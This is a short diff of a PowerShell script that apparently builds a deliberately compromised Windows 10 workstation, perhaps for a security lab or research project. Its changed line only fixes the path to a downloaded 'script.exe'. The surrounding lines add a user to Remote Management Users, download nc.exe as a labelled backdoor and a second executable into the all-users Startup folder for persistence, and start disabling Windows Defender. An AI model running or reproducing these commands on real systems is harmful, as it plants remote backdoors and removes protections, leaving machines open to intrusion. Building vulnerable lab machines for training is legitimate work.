@@ -8,7 +8,7 @@ Add-LocalGroupMember -Group "Remote Management Users" -Member "john"
 
 # download nc backdoor to startup folder
 curl "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\nc.exe"
-curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/script.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\script.exe"
+curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/executables/script.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\script.exe"
 
 # disable windows defender and real-time protection
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
